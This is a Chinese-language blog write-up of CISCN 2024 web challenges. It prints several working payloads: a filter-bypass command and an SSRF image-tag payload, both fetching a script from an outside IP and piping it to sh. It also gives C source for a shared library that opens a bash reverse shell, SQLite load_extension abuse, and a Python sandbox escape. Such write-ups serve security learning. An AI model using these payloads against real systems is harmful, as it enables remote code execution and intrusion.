@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>全国大学生信息安全竞赛 CISCN 2024 Web Writeup - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="全国大学生信息安全竞赛 CISCN 2024 Web Writeup - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://boogipop.com/2024/05/27/CISCN%202024%20%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%20Web%20Writeup/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2024-05-27T03:51:24.427Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/WriteUp/">WriteUp</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>May</span>
+            <span>27,</span>
+            <span>2024</span>
+        </div>
+        
+
+        <h2 class="title">全国大学生信息安全竞赛 CISCN 2024 Web Writeup</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">     <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\&#x27;|\&quot;|id|whoami/i&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">         <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这个open_basedir是一点用没有的。最终payload可以利用<code>eval </code>xxx<code>配合`\`反斜杠去绕过关键字就可以 `cmd=eval `ec\ho Y3VybCBo\dHRwOi8vOC4xMzAuMjQuMTg4OjgwMDAvMS5zaHxzaA==|base\64 -d|s\h</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716112779484-f715a06a-b023-43c6-b3b7-5b5f37c9176a.png#averageHue=%232c2e39&clientId=uc7aa35c2-bfa6-4&from=paste&height=836&id=u29cde1b3&originHeight=1672&originWidth=2632&originalType=binary&ratio=2&rotation=0&showTitle=false&size=279670&status=done&style=none&taskId=u664783d0-4ffb-4c7a-9777-6e3c036392f&title=&width=1316" alt="image.png"><br>反弹shell过后发现没有flag文件，查看ps -ef<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716112803066-5cf59c4f-4d94-4526-b709-c6b1eeca2f53.png#averageHue=%232d2f3a&clientId=uc7aa35c2-bfa6-4&errorMessage=unknown%20error&from=paste&height=836&id=u7fb1cb3a&originHeight=1672&originWidth=2632&originalType=binary&ratio=2&rotation=0&showTitle=false&size=546852&status=error&style=none&taskId=u44425b1a-41aa-4f3f-83fe-7474a24b20b&title=&width=1316" alt="image.png"><br>发现存在mysql，上线cs平台后mysql -uroot -proot直接连进去读flag了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/29650981/1716108068346-6ad5dcf2-28d6-4be5-8635-c30948655048.png#averageHue=%2330323a&clientId=u21684f9d-2324-4&from=paste&height=704&id=EiRhh&originHeight=1056&originWidth=1803&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=311401&status=done&style=none&taskId=u5c79f255-a26b-4400-8596-7618aa5424b&title=&width=1202" alt="image.png"></p>
+<h1 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h1><p>dirsearch可以扫出flag.php，内容后面给了hint</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;Just input &#x27;cmd&#x27; From 127.0.0.1&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>也就是说让我们找到一个ssrf的点位就行了。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716111579072-04af536a-c64d-407b-a0af-624143ac59b8.png#averageHue=%2325262a&clientId=uc7aa35c2-bfa6-4&from=paste&height=965&id=u91365f33&originHeight=1930&originWidth=3218&originalType=binary&ratio=2&rotation=0&showTitle=false&size=743970&status=done&style=none&taskId=u9ee26ecb-4952-4e06-ac4b-5e33abc6d9f&title=&width=1609" alt="image.png"><br>源码审计发现down_img路由存在ssrf漏洞<br>但是我们要满足一个正则<code>/(src)=([\&quot;|&#39;]?)([^ \&quot;&#39;&gt;]+)\\2/i&quot;</code>，这个正则的含义其实也就是<img>标签的内容，example:<code>&lt;img src=&quot;http://xxx?cmd=whoami&quot;/&gt;</code><br>这个路由原本是用来识别img标签里的src位置的，但我们可控输入所以就造成了ssrf，最终poc<br><code>value=&lt;img src=&quot;[http://127.0.0.1/flag.php?cmd=curl%24IFS%249http%3A%2F%2F8.130.24.188%3A8000%2F1.sh%7Csh&quot;](http://127.0.0.1/flag.php?cmd=curl%24IFS%249http%3A%2F%2F8.130.24.188%3A8000%2F1.sh%7Csh&quot;) alt=&quot;Example Image&quot;&gt;</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716112211908-61b8b1a7-da2c-4baa-a618-cb9b48ac064d.png#averageHue=%23b1b1b1&clientId=uc7aa35c2-bfa6-4&from=paste&height=1041&id=u67773f13&originHeight=2082&originWidth=3528&originalType=binary&ratio=2&rotation=0&showTitle=false&size=388306&status=done&style=none&taskId=u7d26b620-6c4d-4335-96ee-f70eca43c2d&title=&width=1764" alt="image.png"><br>发送请求后vps收到请求<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716112233991-2cb69a97-a839-4a9d-ad3d-1a1f7dc0ed3b.png#averageHue=%232c2e39&clientId=uc7aa35c2-bfa6-4&from=paste&height=836&id=u809d9ff4&originHeight=1672&originWidth=2632&originalType=binary&ratio=2&rotation=0&showTitle=false&size=287165&status=done&style=none&taskId=u03f4e00c-acc1-46fe-a660-db328589439&title=&width=1316" alt="image.png"><br>最终拿到flag</p>
+<h1 id="ezjava"><a href="#ezjava" class="headerlink" title="ezjava"></a>ezjava</h1><p>考点是Java的Jdbc Attack对应的Sqlite部分。<br>虽然题目给了3个JDBC服务，但其实可以利用的只有sqlite，目的是rce。注意到开启了extension_enable选项<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716108985265-0ff4a79e-364a-475c-939c-768d58cf28ba.png#averageHue=%23222326&clientId=uc7aa35c2-bfa6-4&from=paste&height=363&id=zRnHo&originHeight=726&originWidth=2140&originalType=binary&ratio=2&rotation=0&showTitle=false&size=186280&status=done&style=none&taskId=u2dc5f5f6-4e34-4e57-a41c-59101e73a2a&title=&width=1070" alt="image.png"><br>开启了拓展支持，并且已经有了相关的攻击面文章<br><a target="_blank" rel="noopener" href="https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf">https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf</a><br>在这个ppt里我们知道如何去加载远程的db文件。首先我们开启远程debug调试一下看看逻辑。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716110715893-885c0680-942d-4c2b-bc94-fc210a34fa74.png#averageHue=%23556e65&clientId=uc7aa35c2-bfa6-4&from=paste&height=826&id=z9RnT&originHeight=1652&originWidth=3444&originalType=binary&ratio=2&rotation=0&showTitle=false&size=674273&status=done&style=none&taskId=u64857429-ce82-44cd-86d5-50f6a074bd0&title=&width=1722" alt="image.png"><br>这边会取resourceAddr的hashcode加上指定的前缀作为最终的缓存文件名。那么我们的思路就是利用这个特性缓存一个恶意的so文件，这是第一次请求。<br>恶意so文件制作过程如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flag</span><span class="params">()</span> &#123;&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/8.130.24.188/7778 &lt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">space</span><span class="params">()</span> &#123;&#123;</span><br><span class="line">    <span class="comment">// this just exists so the resulting binary is &gt; 500kB</span></span><br><span class="line">         <span class="type">static</span> <span class="type">char</span> waste[<span class="number">500</span> * <span class="number">1024</span>] = &#123;&#123;<span class="number">2</span>&#125;&#125;;</span><br><span class="line">&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><code>gcc -shared -fPIC exp.c -o exp.so</code><br>最后我们使用load_extension(‘xxx’,’flag’)函数就会加载flag方法，成功的触发反弹shell了。<br>第二次请求我们就去加载这个恶意so文件。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.javasec.pocs.solutions.ciscn;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.PreparedStatement;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Gen</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">dbFile</span> <span class="operator">=</span> <span class="string">&quot;poc.db&quot;</span>;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(dbFile);</span><br><span class="line">            Class.forName(<span class="string">&quot;org.sqlite.JDBC&quot;</span>);</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(<span class="string">&quot;jdbc:sqlite:&quot;</span>+dbFile);</span><br><span class="line">            System.out.println(<span class="string">&quot;Opened database successfully&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;CREATE VIEW security as SELECT ( SELECT load_extension(&#x27;/tmp/sqlite-jdbc-tmp-1914716480.db&#x27;,&#x27;flag&#x27;));&quot;</span>;  <span class="comment">//向其中插入传入的三个参数</span></span><br><span class="line">            <span class="type">PreparedStatement</span> <span class="variable">preStmt</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line"></span><br><span class="line">            preStmt.executeUpdate();</span><br><span class="line">            preStmt.close();</span><br><span class="line">            conn.close();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们生成恶意db文件的脚本如上，可以看到我们创建了一个security表，然后用到了as SELECT语句。（security表用的是ppt里的，直接复制粘贴了）<br>然后我们发起请求就会触发select语句<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716110930844-2d9caf1d-fab5-44f2-96a6-5738c5b77383.png#averageHue=%23232427&clientId=uc7aa35c2-bfa6-4&from=paste&height=256&id=UcmA2&originHeight=512&originWidth=1948&originalType=binary&ratio=2&rotation=0&showTitle=false&size=118260&status=done&style=none&taskId=ue8bddff1-053c-4dc8-a241-6a3e064477d&title=&width=974" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716110926524-d7586cb7-47c4-4a60-9ff5-9fd7e301dc4a.png#averageHue=%23212226&clientId=uc7aa35c2-bfa6-4&from=paste&height=558&id=kkYrM&originHeight=1116&originWidth=1848&originalType=binary&ratio=2&rotation=0&showTitle=false&size=177962&status=done&style=none&taskId=ua22bb6c4-5230-4f54-917d-fff4015ecc0&title=&width=924" alt="image.png"><br>然后就开始实操。首先先让目标缓存一下我们的so文件<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716111203456-52626a01-d2d7-4a32-9323-7db9f81f58c1.png#averageHue=%23282b3a&clientId=uc7aa35c2-bfa6-4&from=paste&height=823&id=Ebp6p&originHeight=1646&originWidth=2574&originalType=binary&ratio=2&rotation=0&showTitle=false&size=680340&status=done&style=none&taskId=u2eb403f0-a5d0-47a5-83a9-da902048e45&title=&width=1287" alt="image.png"><br>然后我们再去加载恶意db，触发指定的sql语句。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716111242096-11de341f-e12e-44a0-91a0-488dfe842a88.png#averageHue=%232a2c3b&clientId=uc7aa35c2-bfa6-4&from=paste&height=800&id=aPkOQ&originHeight=1600&originWidth=2628&originalType=binary&ratio=2&rotation=0&showTitle=false&size=773480&status=done&style=none&taskId=u070fab08-d874-4f9b-a61a-74d49bef7bc&title=&width=1314" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716111250480-2d1ed89b-ca2d-4d6b-a21c-c3831c26dc0a.png#averageHue=%232c2e39&clientId=uc7aa35c2-bfa6-4&from=paste&height=836&id=sLFEn&originHeight=1672&originWidth=2632&originalType=binary&ratio=2&rotation=0&showTitle=false&size=286037&status=done&style=none&taskId=u6d4908b0-ab05-43e8-8330-08a5b1548ab&title=&width=1316" alt="image.png"><br>最终获取flag</p>
+<h1 id="mossfern"><a href="#mossfern" class="headerlink" title="mossfern"></a>mossfern</h1><p>yjail frame帧逃逸<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13635?time__1311=mqmxnQ0QiQi=DteDsD7md0=dG=d8bgh8wiD#toc-5">https://xz.aliyun.com/t/13635?time__1311&#x3D;mqmxnQ0QiQi%3DDteDsD7md0%3DdG%3Dd8bgh8wiD#toc-5</a><br>参考上述文章</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /api/run HTTP/<span class="number">1.1</span></span><br><span class="line">Host: eci-2zeflmaf18usxi7ngaav.cloudeci1.ichunqiu.com</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.9</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10_15_7</span>) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">124.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Content-<span class="type">Type</span>: application/json</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Origin: http://eci-2zeflmaf18usxi7ngaav.cloudeci1.ichunqiu.com</span><br><span class="line">Referer: http://eci-2zeflmaf18usxi7ngaav.cloudeci1.ichunqiu.com/</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=<span class="number">1713496688</span>,<span class="number">1713681080</span>,<span class="number">1715993802</span></span><br><span class="line">Content-Length: <span class="number">199</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;def boogipop():\n    def exp():\n        yield pop.gi_frame.f_back.f_back.f_back\n    pop = exp()\n    for exp in pop:\n        boo=exp\n    return boo\nkino=boogipop()\nprint(kino)&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716108779323-eb6efc91-f311-41a3-8b2c-e9012a933c19.png#averageHue=%23d9dfca&clientId=uc7aa35c2-bfa6-4&from=paste&height=909&id=urVbQ&originHeight=1818&originWidth=2972&originalType=binary&ratio=2&rotation=0&showTitle=false&size=743547&status=done&style=none&taskId=u6ba949b6-c518-4ee3-b79e-2cb601ca678&title=&width=1486" alt="image.png"><br>可以看到已经获取到了f_code对象，根据文章中所说到的<br>f_code存在co_consts对象。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716108831657-295aa243-c34e-4693-aa70-16956fb12cca.png#averageHue=%23242528&clientId=uc7aa35c2-bfa6-4&from=paste&height=880&id=F6qjn&originHeight=1760&originWidth=3318&originalType=binary&ratio=2&rotation=0&showTitle=false&size=295830&status=done&style=none&taskId=u127d5339-c078-4418-8d19-b1cdd38d63f&title=&width=1659" alt="image.png"><br>但是在本地测试的时候发现由于结果出现了flag字眼就会被拦截，这里其实很好绕过。<br>因为是全字符串检测，我们字符串截取部分自然就可以返回flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">boogipop</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">        <span class="keyword">yield</span> pop.gi_frame.f_back.f_back.f_back</span><br><span class="line">    pop = exp()</span><br><span class="line">    <span class="keyword">for</span> exp <span class="keyword">in</span> pop:</span><br><span class="line">        boo=exp</span><br><span class="line">    <span class="keyword">return</span> boo</span><br><span class="line">kino=boogipop()</span><br><span class="line"><span class="built_in">print</span>(kino.f_code.co_consts[<span class="number">19</span>][<span class="number">1</span>:])</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716108877232-9f24eebd-c30f-4397-bb12-c40d1d6de201.png#averageHue=%23dfdfdf&clientId=uc7aa35c2-bfa6-4&from=paste&height=840&id=vvoFG&originHeight=1680&originWidth=2728&originalType=binary&ratio=2&rotation=0&showTitle=false&size=433681&status=done&style=none&taskId=u2f8b3324-a2e3-41eb-8bbe-984615839cf&title=&width=1364" alt="image.png"></p>
+<h1 id="easycms-revenge"><a href="#easycms-revenge" class="headerlink" title="easycms_revenge"></a>easycms_revenge</h1><p>和第一天的都一样<br><code>value=&lt;img src=&quot;[http://127.0.0.1/flag.php?cmd=curl%24IFS%249http%3A%2F%2F8.130.24.188%3A8000%2F1.sh%7Csh&quot;](http://127.0.0.1/flag.php?cmd=curl%24IFS%249http%3A%2F%2F8.130.24.188%3A8000%2F1.sh%7Csh&quot;) alt=&quot;Example Image&quot;&gt;</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716112400543-d1f95c44-8c15-4c8c-b7d9-9d5eceef24b6.png#averageHue=%23d9cf95&clientId=uc7aa35c2-bfa6-4&from=paste&height=1041&id=ua30702d1&originHeight=2082&originWidth=3528&originalType=binary&ratio=2&rotation=0&showTitle=false&size=761634&status=done&style=none&taskId=uff0a57b7-1e65-471d-8976-b7474d992a2&title=&width=1764" alt="image.png"><br>发送请求后vps收到请求<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1716112403326-09db90f9-0e7c-4391-91c4-81d1178df519.png#averageHue=%232c2e3a&clientId=uc7aa35c2-bfa6-4&from=paste&height=836&id=u2ce8c8c1&originHeight=1672&originWidth=2632&originalType=binary&ratio=2&rotation=0&showTitle=false&size=392413&status=done&style=none&taskId=u79378ee2-15bd-4634-a506-8fc32810fb5&title=&width=1316" alt="image.png"><br>最终拿到flag</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/WriteUp/" class="tag">#WriteUp</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        <a class="next"></a>
+        
+        <a href="/2024/05/27/JQCTF2024%E3%80%81RCTF2024%20Web%20Writeup/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">JQCTF2024、RCTF2024 Web Writeup</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
